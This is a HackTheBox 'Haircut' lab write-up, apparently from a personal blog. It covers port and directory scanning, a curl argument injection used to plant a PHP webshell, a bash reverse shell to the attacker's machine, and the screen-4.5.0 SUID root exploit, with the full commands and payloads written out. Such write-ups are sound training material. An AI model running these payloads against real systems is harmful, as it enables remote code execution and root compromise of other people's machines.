---
title: HTB - Haircut
date: 2023-08-12 22:30:00 -0500
categories: [Writeups, HackTheBox]
tags: [writeup, hacking, linux] # TAG names should always be lowercase
---

## Machine info

Haircut is a fairly simple machine, however it does touch on several useful attack vectors. Most notably, this machine demonstrates the risk of user-specified CURL arguments, which still impacts many active services today.

<p style="text-align: center;"><a href="https://app.hackthebox.com/machines/Haircut" target="_blank">https://app.hackthebox.com/machines/Haircut</a></p>

![info-card](assets/img/hack-the-box/haircut/haircut-info_card.png){: width="700" }
_Info card_

## Enumeration

We begin our ennumeration by searching for open ports with nmap tool.

```console
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.24 -oG allPorts
```

![nmap-port-scan](assets/img/hack-the-box/haircut/haircut-nmap_port_scan.png)
_Nmap port scan_

We find open 22 (ssh) and 80 (http) open, so we take a look at the webserver running on port 80 and find nothing really interesting.

![webserver](assets/img/hack-the-box/haircut/haircut-webserver.png)
_Werserver on port 80_

Wappalyzer web extension show us that the site's programming language is PHP, which is valuable information at the time of doing web enumeration.

![wappalyzer info](assets/img/hack-the-box/haircut/haircut-wappalyzer.png)
_Wappalyzer_

We do a web scan using the tool <a href="https://github.com/epi052/feroxbuster" target="_blank">feroxbuster</a> in order to discover directories and files with the extension php on the webserver's root path.

```console
feroxbuster -u http://10.10.10.24/ -x php -t 200
```

![feroxbuster](assets/img/hack-the-box/haircut/haircut-feroxbuster.png)
_Feroxbuster scan_

## Gaining a foothold

The results of feroxbuster lead us to a file called `exposed.php` which allows an SSRF vulnerability that let us process requests against localhost inside the webserver machine.

![exposed-php](assets/img/hack-the-box/haircut/haircut-exposed_php.png)
_/exposed.php_

The output from processing the request seems like one of the command `curl`, so we make some tests and find out that our input is being concatenated to a curl command execution.
We can take advantage of this in order to manipulate the command to fetch a request against our attacking machine and save a malicious file inside the webserver adding the `-o` parameter to the command to save the output to a file.

```
http://<ATTACKING-IP>/php-webshell.php -o /var/www/html/uploads/php-webshell.php
```

This way we upload a webshell, which we can access through the path `/uploads/php-webshell.php`{: .filepath} of the webserver.<br>
This is the payload of our php webshell in which we can execute commands via the cmd parameter.

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
{: file="php-webshell.php" }

![webshell](assets/img/hack-the-box/haircut/haircut-webshell.png)
_PHP webshell_

Now that we have RCE on the victim machine, we can send us a reverse shell for convenience.

```
bash -c 'bash -i 1>%26 /dev/tcp/<ATTACKER-IP>/<PORT> 0>%261'
```

![reverse-shell](assets/img/hack-the-box/haircut/haircurt-reverse_shell.png)
_Reverse shell connection_

## Privilege escalation

In order to escalate privileges we check for files with SUID permission.

```console
find / -user root -perm /4000 2>/dev/null
```

![suid-binaries](assets/img/hack-the-box/haircut/haircut-suid.png)
_www-data SUID binaries_

We find an unusual binary `screen-4.50` with the SUID permission, so we look for an <a href="https://www.exploit-db.com/exploits/41154" target="_blank">exploit</a> and luckily find one.<br>
We try to run it on the victim machine, but gcc seems to be broken, so we follow the compilation steps of the script locally on our attacking machine. That should leave us with two files, `lihax.so` and `rootshell` that we have to transfer to the victim machine on the `/tmp`{: .filepath} directory. Now there we finish to execute the commands from the script.

```console
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

![priv-esc](assets/img/hack-the-box/haircut/haircut-priv_esc.png)
_Exploit commands execution_

And that way we gain a root shell on the victim machine.<br>
The flags for user and root can be found on `/home/marie/user.txt`{: .filepath} and `/root/root.txt`{: .filepath} respectively.
